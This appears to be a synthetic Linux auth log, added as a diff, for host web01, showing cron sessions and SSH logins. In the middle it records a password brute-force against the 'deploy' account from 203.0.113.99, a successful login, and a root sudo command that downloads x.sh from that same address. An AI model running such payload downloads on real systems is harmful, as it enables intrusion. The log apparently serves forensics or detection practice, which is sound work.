+Oct 24 13:28:01 web01 CRON[28474]: pam_unix(cron:session): session closed for user root
+Oct 24 13:42:00 web01 CRON[35261]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 13:42:01 web01 CRON[21733]: pam_unix(cron:session): session closed for user root
+Oct 24 13:50:00 web01 CRON[21590]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 13:50:01 web01 CRON[16642]: pam_unix(cron:session): session closed for user root
+Oct 24 13:57:00 web01 CRON[20660]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 13:57:01 web01 CRON[30964]: pam_unix(cron:session): session closed for user root
+Oct 24 14:03:00 web01 CRON[1610]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 14:03:01 web01 CRON[31034]: pam_unix(cron:session): session closed for user root
+Oct 24 14:17:00 web01 CRON[7552]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 14:17:01 web01 CRON[5801]: pam_unix(cron:session): session closed for user root
+Oct 24 14:30:00 web01 CRON[18380]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 14:30:01 web01 CRON[9680]: pam_unix(cron:session): session closed for user root
+Oct 24 14:36:00 web01 CRON[17009]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 14:36:01 web01 CRON[25217]: pam_unix(cron:session): session closed for user root
+Oct 24 14:48:00 web01 CRON[36600]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 14:48:01 web01 CRON[20825]: pam_unix(cron:session): session closed for user root
+Oct 24 15:03:00 web01 CRON[35664]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:03:01 web01 CRON[1512]: pam_unix(cron:session): session closed for user root
+Oct 24 15:05:00 web01 sshd[18887]: Failed password for deploy from 203.0.113.99 port 47049 ssh2
+Oct 24 15:05:01 web01 sshd[18887]: Connection closed by authenticating user deploy 203.0.113.99 port 47049 [preauth]
+Oct 24 15:05:30 web01 sshd[2902]: Failed password for deploy from 203.0.113.99 port 45510 ssh2
+Oct 24 15:05:31 web01 sshd[2902]: Connection closed by authenticating user deploy 203.0.113.99 port 45510 [preauth]
+Oct 24 15:05:55 web01 sshd[27497]: Failed password for deploy from 203.0.113.99 port 56497 ssh2
+Oct 24 15:05:56 web01 sshd[27497]: Connection closed by authenticating user deploy 203.0.113.99 port 56497 [preauth]
+Oct 24 15:06:15 web01 sshd[31630]: Failed password for deploy from 203.0.113.99 port 36950 ssh2
+Oct 24 15:06:16 web01 sshd[31630]: Connection closed by authenticating user deploy 203.0.113.99 port 36950 [preauth]
+Oct 24 15:06:49 web01 sshd[36004]: Failed password for deploy from 203.0.113.99 port 33651 ssh2
+Oct 24 15:06:50 web01 sshd[36004]: Connection closed by authenticating user deploy 203.0.113.99 port 33651 [preauth]
+Oct 24 15:07:16 web01 sshd[39790]: Failed password for deploy from 203.0.113.99 port 51261 ssh2
+Oct 24 15:07:17 web01 sshd[39790]: Connection closed by authenticating user deploy 203.0.113.99 port 51261 [preauth]
+Oct 24 15:07:31 web01 sshd[6501]: Failed password for deploy from 203.0.113.99 port 53829 ssh2
+Oct 24 15:07:32 web01 sshd[6501]: Connection closed by authenticating user deploy 203.0.113.99 port 53829 [preauth]
+Oct 24 15:07:59 web01 sshd[9893]: Accepted password for deploy from 203.0.113.99 port 47896 ssh2
+Oct 24 15:07:59 web01 sshd[9893]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 15:08:59 web01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.99/x.sh
+Oct 24 15:11:00 web01 sshd[39311]: Accepted publickey for backup from 198.51.100.50 port 46806 ssh2
+Oct 24 15:11:00 web01 sshd[39311]: pam_unix(sshd:session): session opened for user backup(uid=1000) by (uid=0)
+Oct 24 15:16:00 web01 CRON[20620]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:16:01 web01 CRON[7788]: pam_unix(cron:session): session closed for user root
+Oct 24 15:20:59 web01 sshd[9893]: Received disconnect from 203.0.113.99 port 47896:11: disconnected by user
+Oct 24 15:20:59 web01 sshd[9893]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 15:23:00 web01 CRON[18332]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:23:01 web01 CRON[8564]: pam_unix(cron:session): session closed for user root
+Oct 24 15:25:00 web01 sshd[24700]: Accepted publickey for deploy from 198.51.100.8 port 51686 ssh2
+Oct 24 15:25:00 web01 sshd[24700]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 15:36:00 web01 CRON[11187]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:36:01 web01 CRON[18848]: pam_unix(cron:session): session closed for user root
+Oct 24 15:39:00 web01 sshd[24700]: Received disconnect from 198.51.100.8 port 51686:11: disconnected by user
+Oct 24 15:39:00 web01 sshd[24700]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 15:44:00 web01 CRON[23471]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:44:01 web01 CRON[14342]: pam_unix(cron:session): session closed for user root
+Oct 24 15:50:00 web01 sshd[39311]: Received disconnect from 198.51.100.50 port 46806:11: disconnected by user
+Oct 24 15:50:00 web01 sshd[39311]: pam_unix(sshd:session): session closed for user backup
+Oct 24 15:53:00 web01 CRON[34122]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:53:01 web01 CRON[33016]: pam_unix(cron:session): session closed for user root
+Oct 24 15:58:00 web01 CRON[7048]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 15:58:01 web01 CRON[28759]: pam_unix(cron:session): session closed for user root
+Oct 24 16:03:00 web01 sshd[1425]: Accepted publickey for deploy from 198.51.100.8 port 57632 ssh2
+Oct 24 16:03:00 web01 sshd[1425]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 16:03:00 web01 CRON[1232]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:03:01 web01 CRON[22859]: pam_unix(cron:session): session closed for user root
+Oct 24 16:15:00 web01 sshd[1425]: Received disconnect from 198.51.100.8 port 57632:11: disconnected by user
+Oct 24 16:15:00 web01 sshd[1425]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 16:18:00 web01 CRON[18167]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:18:01 web01 CRON[11589]: pam_unix(cron:session): session closed for user root
+Oct 24 16:23:00 web01 sshd[36005]: Accepted password for bob from 198.51.100.34 port 56660 ssh2
+Oct 24 16:23:00 web01 sshd[36005]: pam_unix(sshd:session): session opened for user bob(uid=1000) by (uid=0)
+Oct 24 16:31:00 web01 CRON[29028]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:31:01 web01 CRON[37759]: pam_unix(cron:session): session closed for user root
+Oct 24 16:31:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 16:37:00 web01 CRON[10768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:37:01 web01 CRON[36755]: pam_unix(cron:session): session closed for user root
+Oct 24 16:37:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 16:40:00 web01 sshd[36005]: Received disconnect from 198.51.100.34 port 56660:11: disconnected by user
+Oct 24 16:40:00 web01 sshd[36005]: pam_unix(sshd:session): session closed for user bob
+Oct 24 16:47:00 web01 CRON[39175]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:47:01 web01 CRON[37210]: pam_unix(cron:session): session closed for user root
+Oct 24 16:47:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 16:54:00 web01 CRON[3741]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:54:01 web01 CRON[21202]: pam_unix(cron:session): session closed for user root
+Oct 24 16:59:00 web01 CRON[24449]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 16:59:01 web01 CRON[14767]: pam_unix(cron:session): session closed for user root
+Oct 24 17:14:00 web01 CRON[7736]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:14:01 web01 CRON[24178]: pam_unix(cron:session): session closed for user root
+Oct 24 17:25:00 web01 CRON[11128]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:25:01 web01 CRON[16514]: pam_unix(cron:session): session closed for user root
+Oct 24 17:32:00 web01 CRON[28020]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:32:01 web01 CRON[2624]: pam_unix(cron:session): session closed for user root
+Oct 24 17:42:00 web01 CRON[27982]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:42:01 web01 CRON[17263]: pam_unix(cron:session): session closed for user root
+Oct 24 17:48:00 web01 CRON[26070]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:48:01 web01 CRON[3537]: pam_unix(cron:session): session closed for user root
+Oct 24 17:54:00 web01 sshd[19210]: Accepted publickey for deploy from 198.51.100.8 port 37862 ssh2
+Oct 24 17:54:00 web01 sshd[19210]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 17:56:00 web01 CRON[14079]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 17:56:01 web01 CRON[31166]: pam_unix(cron:session): session closed for user root
+Oct 24 18:04:00 web01 CRON[15609]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:04:01 web01 CRON[2550]: pam_unix(cron:session): session closed for user root
+Oct 24 18:09:00 web01 sshd[19210]: Received disconnect from 198.51.100.8 port 37862:11: disconnected by user
+Oct 24 18:09:00 web01 sshd[19210]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 18:15:00 web01 CRON[22512]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:15:01 web01 CRON[19258]: pam_unix(cron:session): session closed for user root
+Oct 24 18:24:00 web01 CRON[24012]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:24:01 web01 CRON[34384]: pam_unix(cron:session): session closed for user root
+Oct 24 18:27:00 web01 sshd[9180]: Accepted publickey for deploy from 198.51.100.8 port 45171 ssh2
+Oct 24 18:27:00 web01 sshd[9180]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 18:34:00 web01 sshd[36741]: Failed password for kaseem from 198.51.100.7 port 35616 ssh2
+Oct 24 18:34:00 web01 sshd[9180]: Received disconnect from 198.51.100.8 port 45171:11: disconnected by user
+Oct 24 18:34:00 web01 sshd[9180]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 18:34:01 web01 sshd[36741]: Connection closed by authenticating user kaseem 198.51.100.7 port 35616 [preauth]
+Oct 24 18:34:18 web01 sshd[3082]: Accepted password for kaseem from 198.51.100.7 port 33744 ssh2
+Oct 24 18:34:18 web01 sshd[3082]: pam_unix(sshd:session): session opened for user kaseem(uid=1000) by (uid=0)
+Oct 24 18:37:00 web01 CRON[22702]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:37:01 web01 CRON[2808]: pam_unix(cron:session): session closed for user root
+Oct 24 18:37:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 18:41:18 web01 sshd[3082]: Received disconnect from 198.51.100.7 port 33744:11: disconnected by user
+Oct 24 18:41:18 web01 sshd[3082]: pam_unix(sshd:session): session closed for user kaseem
+Oct 24 18:46:00 web01 CRON[12702]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:46:01 web01 CRON[39049]: pam_unix(cron:session): session closed for user root
+Oct 24 18:55:00 web01 CRON[3507]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 18:55:01 web01 CRON[8104]: pam_unix(cron:session): session closed for user root
+Oct 24 19:01:00 web01 sshd[7078]: Accepted publickey for deploy from 198.51.100.8 port 45217 ssh2
+Oct 24 19:01:00 web01 sshd[7078]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 19:05:00 web01 CRON[21557]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 19:05:01 web01 CRON[29599]: pam_unix(cron:session): session closed for user root
+Oct 24 19:09:00 web01 sshd[7078]: Received disconnect from 198.51.100.8 port 45217:11: disconnected by user
+Oct 24 19:09:00 web01 sshd[7078]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 19:18:00 web01 CRON[8578]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 19:18:01 web01 CRON[26244]: pam_unix(cron:session): session closed for user root
+Oct 24 19:26:00 web01 CRON[17693]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 19:26:01 web01 CRON[3908]: pam_unix(cron:session): session closed for user root
+Oct 24 19:31:00 web01 CRON[35073]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 19:31:01 web01 CRON[36287]: pam_unix(cron:session): session closed for user root
+Oct 24 19:46:00 web01 CRON[13912]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 19:46:01 web01 CRON[24869]: pam_unix(cron:session): session closed for user root
